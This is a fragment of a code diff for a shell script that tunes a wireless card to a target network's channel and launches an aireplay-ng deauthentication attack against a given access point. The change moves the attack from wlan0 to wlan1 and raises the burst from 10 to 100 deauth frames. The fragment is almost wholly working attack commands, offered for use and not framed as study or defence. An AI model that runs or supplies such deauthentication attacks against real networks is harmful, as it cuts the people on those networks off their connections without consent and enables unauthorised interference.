@@ -27,7 +27,7 @@ else
 	targetChannel=${targetChannel##*( )}
 	#echo "Target Channel: $targetChannel"
 	#sudo iwconfig wlan0 channel 11
-	sudo iwconfig wlan0 channel $targetChannel
+	sudo iwconfig wlan1 channel $targetChannel
 	# send attack to selected network
-	sudo aireplay-ng --deauth 10 -a $1 -D wlan0
+	sudo aireplay-ng --deauth 100 -a $1 -D wlan1
 fi
